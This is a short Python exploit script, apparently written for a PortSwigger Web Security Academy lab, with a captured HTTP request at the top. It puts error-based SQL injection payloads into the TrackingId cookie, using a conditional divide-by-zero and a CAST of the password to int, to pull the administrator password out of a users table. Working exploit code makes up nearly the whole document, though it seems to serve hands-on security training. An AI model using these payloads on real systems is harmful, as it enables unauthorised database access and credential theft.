'''
GET / HTTP/2
Host: 0a32000d03a1209881ea3e080091000e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Connection: keep-alive
Cookie: TrackingId=LDRiyD2pbpPxMNqH; session=z87Ka4Qk9TeIPy4A22AEOGhn3ommWF33
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
'''


import requests
from bs4 import BeautifulSoup


url = "https://0a32000d03a1209881ea3e080091000e.web-security-academy.net/"

headers = {
    "Host": "0a32000d03a1209881ea3e080091000e.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://portswigger.net/",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site"
}

cookies = {
    "TrackingId": "LDRiyD2pbpPxMNqH",
    "session": "z87Ka4Qk9TeIPy4A22AEOGhn3ommWF33"
}

def test_query(query):
    cookies["TrackingId"] = query
    response = requests.get(url , headers=headers, cookies=cookies)
    
    soup = BeautifulSoup(response.text, "html.parser")

    if soup.find("h4"):
        print(soup.find_all("p", class_="is-warning")[0].text)
    else:
        print("No result")

# test_query("' and (SELECT CASE WHEN (username='administrator' and LENGTH(password) > 1) THEN TO_CHAR(1/0) ELSE 'a' END from users)='a' --")
# test_query("' and (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'a' END)='a' --")
# test_query("' and SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')")
test_query("' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--")